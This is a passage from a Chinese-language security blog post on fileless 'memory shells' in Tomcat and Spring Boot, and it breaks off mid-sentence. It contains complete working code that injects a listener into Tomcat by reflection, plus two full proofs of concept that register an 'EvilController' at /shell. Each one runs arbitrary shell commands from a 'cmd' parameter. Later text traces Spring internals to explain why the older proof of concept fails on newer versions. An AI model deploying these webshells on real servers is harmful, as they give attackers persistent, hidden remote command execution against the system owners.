ApplicationContext类也有一个context的私有属性，其类型为TomcatEmbeddedContext类，而这个类正是StandardContext类的子类</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;standardContext = &quot;</span> + standardContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// --------------------下面开始是关键------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                out = response.getWriter();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    standardContext.addApplicationEventListener(listener);</span><br><span class="line">    response.getWriter().write(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="框架组件"><a href="#框架组件" class="headerlink" title="框架组件"></a>框架组件</h2><p>前面是分析如何通过动态添加 <code>Servlet</code> 组件来实现内存马，下面接着分析如何通过动态添加框架的组件来实现内存马。</p><p>这里说到的框架有很多，<code>Spring</code>、<code>SpringBoot</code>、<code>Weblogic</code> 等。</p><p>这边主要说下 <code>SpringBoot</code> 框架的组件内存马的实现：动态注册 <code>Controller</code> 来实现内存马：</p><p><code>SpringBoot</code> 在处理请求的时候的主要逻辑是在 <code>Controller</code> 中进行的，所以我们可以代码层次注册一个<code>Controller</code> 来实现内存马。</p><h3 id="SpringBoot的Controller"><a href="#SpringBoot的Controller" class="headerlink" title="SpringBoot的Controller"></a>SpringBoot的Controller</h3><p>这里先分析一下 <code>SpringBoot</code> 的 <code>Controller</code> 是如何注册的。</p><h4 id="Spring中Controller注册涉及到的类"><a href="#Spring中Controller注册涉及到的类" class="headerlink" title="Spring中Controller注册涉及到的类"></a>Spring中Controller注册涉及到的类</h4><p><code>Spring</code> 注册 <code>Controller</code> 主要是通过 <code>AbstractHandlerMethodMapping#registerMapping())</code> 方法（也可以是 <code>registerHandlerMethod()</code> 方法，两者接收的参数相同，最终走向也相同）来注册的。这个方法需要 <code>handler</code> 参数（也就是 <code>controller</code> 所在的类），<code>method</code> 参数（ <code>controller</code> 类的哪个方法定义为 <code>controller</code> ，在这里这个就是内存马所定义在的位置），<code>mapping</code> 参数（ 有关于 <code>controller</code> 的匹配路径信息）。</p><p><img src="/imgs/1694443059747.png"></p><p><img src="/imgs/1694444066832.png"></p><p><img src="/imgs/1694444142751.png"></p><p>在这两个方法中，注册 <code>Controller</code> 又都交给了 <code>AbstractHandlerMethodMapping</code> 的内部类 <code>MappingRegistry</code> 的 <code>register()</code> 方法来处理。</p><p><img src="/imgs/1694443083571.png"></p><p><img src="/imgs/1694443109368.png"></p><p>可以分析 <code>Controller</code> 的信息都存放在 <code>AbstractHandlerMethodMapping#MappingRegistry</code> 的 <code>register</code> 属性当中。</p><p><img src="/imgs/1694443278608.png"></p><p><code>register</code> 属性是一个 <code>map</code> ，<code>key</code> 为 <code>RequestMappingInfo</code> 的对象，主要存放关于 <code>Controller</code> 的映射路径信息，<code>value</code> 为 <code>AbstractHandlerMethodMapping$MappingRegistration</code> 的对象，主要存放每个 <code>Controller</code> 的具体操作。</p><p><img src="/imgs/1694443579489.png"></p><blockquote><p>总结：从上面的分析中，我们可以得知动态注册一个 <code>controller</code> 的步骤是：</p><ol><li>注册一个 <code>RequestMappingInfo</code> 的对象，用来定义 <code>controller</code> 的如何生效。</li><li>注册一个 <code>controller</code> 类，在其中定义具体的 <code>controller</code> 接收一个请求的具体处理方法。</li><li>将上面注册好的信息传入 <code>AbstractHandlerMethodMapping#registerMapping()</code> 方法中。</li></ol></blockquote><p>具体如何获取 <code>Spring</code> 中的 <code>AbstractHandlerMethodMapping</code> ，从而能让它帮我们动态注册 <code>controller</code> ，我们直接看后面的代码就知道了。</p><h4 id="低版本Spring动态注册Controller的代码"><a href="#低版本Spring动态注册Controller的代码" class="headerlink" title="低版本Spring动态注册Controller的代码"></a>低版本Spring动态注册Controller的代码</h4><blockquote><p>下面的代码适用于 <code>Spring-5.3.2</code> 以下，对应 <code>SpringBoot-2.6</code> 以下。<code>SpringBoot-2.6</code> 以后<code>RequestMappingInfo</code> 的初始化构造发生了一些变化，否则会失败。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo03Controller</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/demo01&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">demo01</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">// 获取Context</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.</span><br><span class="line">                currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射获得恶意类的test方法(根据test方法是否带了参数来选择用下面两个哪个)</span></span><br><span class="line">        <span class="comment">//Method method = EvilController.class.getMethod(&quot;test&quot;);</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilController.class.getMethod(<span class="string">&quot;test&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 定义该controller的path</span></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/shell&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义允许访问的HTTP方法</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 构造注册信息</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 创建用于处理请求的对象，避免无限循环使用一个构造方法</span></span><br><span class="line">        <span class="type">EvilController</span> <span class="variable">injectToController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilController</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="comment">// 将该controller注册到Spring容器</span></span><br><span class="line">        mappingHandlerMapping.registerMapping(info, injectToController, method);</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilController</span><span class="params">(String xxx)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//这里test方法也可以不需要request，response参数，直接通过下面的静态方式获取</span></span><br><span class="line"><span class="comment">//            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span></span><br><span class="line"><span class="comment">//            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span></span><br><span class="line">            <span class="comment">// 获取cmd参数并执行命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (command != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.io.<span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ProcessBuilder p;</span><br><span class="line">                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    o = c.hasNext() ? c.next() : o;</span><br><span class="line">                    c.close();</span><br><span class="line">                    printWriter.write(o);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                    printWriter.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 <code>RequestMappingHandlerMapping</code> 是 <code>AbstractHandlerMethodMapping</code> 抽象类的子类，而 <code>Spring</code> 的 <code>RequestMappingHandlerMapping</code> 可以通过 <code>RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</code> 获取 <code>Spring</code> 的 <code>context</code> 后获得。并且我们自定义的 <code>controller</code> 默认没有注入 <code>request</code> 和 <code>response</code> 的问题也可以通过这个方式解决，具体看上面的代码实现就好了。</p><p><img src="/imgs/1694444558104.png"></p><h4 id="高版本Spring动态注册Controller的代码"><a href="#高版本Spring动态注册Controller的代码" class="headerlink" title="高版本Spring动态注册Controller的代码"></a>高版本Spring动态注册Controller的代码</h4><h5 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h5><blockquote><p>两个 <code>poc</code> 本质是一样的，唯一不同之处在于获取 <code>RequestMappingInfo</code> 的方法，低版本的 <code>poc</code> 中直接通过 <code>new</code> 手动创建我们的 <code>RequestMappingInfo</code> ，而第二种 <code>poc</code> 中通过更原始的 <code>build()</code> 方法去获取。</p></blockquote><p>不改的会报下面的错误：</p><p><img src="/imgs/1694448149631.png"></p><p>除非 <code>SpringMVC</code> 有如下配置：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">pathmatch:</span></span><br><span class="line">      <span class="attr">matching-strategy:</span> <span class="string">ant_path_matcher</span></span><br></pre></td></tr></table></figure><p>这是由于 <code>SpringBoot</code> 对 <a href="https://spring.io/blog/2020/06/30/url-matching-with-pathpattern-in-spring-mvc">路由匹配方式进行修改</a> 。<code>SpringBoot-2.6.0</code> 之后，将默认的路由匹配方式由 <code>ant_path_matcher</code> 改为了 <code>path_pattern_parser</code> 。</p><p>但是实战我们肯定改不了目标服务器的配置文件，因此我们需要用下面高版本的 <code>poc</code> 。</p><h5 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意SpringBoot3中的HttpServletRequest和HttpServletResponse和SpringBoot2中的类路径不一样</span></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01Controller</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/demo01&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">demo01</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 获取当前上下文</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射获得mappingHandlerMapping的config属性，这里是为了后面创建RequestMappingInfo对象</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span></span><br><span class="line">                (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">        <span class="comment">// 通过反射获得恶意类的test方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> EvilController.class.getMethod(<span class="string">&quot;test&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">        <span class="comment">// 定义允许访问的HTTP方法</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 构造注册信息（与低版本Spring的poc唯一不同的地方）</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">                .options(config)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="comment">// 创建用于处理请求的对象，避免无限循环使用一个构造方法</span></span><br><span class="line">        <span class="type">EvilController</span> <span class="variable">evilController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilController</span>(<span class="string">&quot;XXX&quot;</span>);</span><br><span class="line">        <span class="comment">// 将该controller注册到Spring容器</span></span><br><span class="line">        mappingHandlerMapping.registerMapping(info, evilController, method2);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;demo01&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilController</span><span class="params">(String xxx)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span></span><br><span class="line"><span class="comment">//            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span></span><br><span class="line">            <span class="comment">// 获取cmd参数并执行命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (command != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.io.<span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ProcessBuilder p;</span><br><span class="line">                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    o = c.hasNext() ? c.next() : o;</span><br><span class="line">                    c.close();</span><br><span class="line">                    printWriter.write(o);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                    printWriter.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>那到底两种初始化 <code>RequestMappingInfo</code> 对象的方式有什么不同呢？这里我们对比调试分析一下。我们先从终点开始，分析代码为什么会报错。</p><p>报错的位置在 <code>UrlPathHelper#getResolvedLookupPath()</code> 方法中，我们可以知道报错的原因是这里的 <code>lookupPath</code> 为 <code>null</code> 。而 <code>lookupPath</code> 是从 <code>request.getAttribute(PATH_ATTRIBUTE)</code> 获得的，那我们自然而然会想到为什么这里 <code>request</code> 里面没有 <code>PATH_ATTRIBUTE</code> 属性。</p><p><img src="/imgs/1694453851506.png"></p><p>我们可以全局搜索一下哪里出现 <code>PATH_ATTRIBUTE</code> 了，看看哪里对 <code>PATH_ATTRIBUTE</code> 进行了操作。这里找的技巧是优先在当前的函数调用堆栈里面找。</p><p><img src="/imgs/1694454336541.png"></p><p>但是不幸的是，这里在函数栈里面出现的类都没有出现 <code>PATH_ATTRIBUTE</code> 这个字眼。但是经过一个个函数调用栈的回退，我找到了一个可疑的函数调用。</p><p><img src="/imgs/1694454609740.png"></p><p>在 <code>AbstractHandlerMethodMapping#getHandlerInternal()</code> 方法的上面我看到了<code>this.initLookupPath(request)</code> 。这个函数感觉就是给 <code>lookupPath</code> 赋值的，从这个函数中我们或许可以分析 <code>lookupPath</code> 后面为什么为空。</p><p><img src="/imgs/1694454761397.png"></p><p>果然在这个函数中发现了 <code>PATH_ATTRIBUTE</code> 。接着我们在这里下个断点，看看流程是怎么走的。</p><p><img src="/imgs/1694454858643.png"></p><p>我们发现代码走到了 <code>request.removeAttribute(UrlPathHelper.PATH_ATTRIBUTE)</code> 这里，怪不得后面 <code>request.getAttribute(PATH_ATTRIBUTE)</code> 为空，就是这里代码走向出现问题的。我们这里也可以对比实验 <code>debug</code> ，看正确的 <code>poc</code> 会走哪个流程，经过实验发现走的是下面，这也就证实了我的观点。</p><p><img src="/imgs/1694455003805.png"></p><p><img src="/imgs/1694455016557.png"></p><p>根据分析 <code>this.usesPathPatterns()</code> 的函数调用，我们可以得知关键的异常在于 <code>AbstractHandlerMapping.patternParser</code> 。正确的 <code>poc</code> 这里应该让 <code>patternParser</code> 为 <code>null</code> 。但是在高版本如果直接在 <code>poc</code> 中 <code>new RequestMappingInfo()</code> 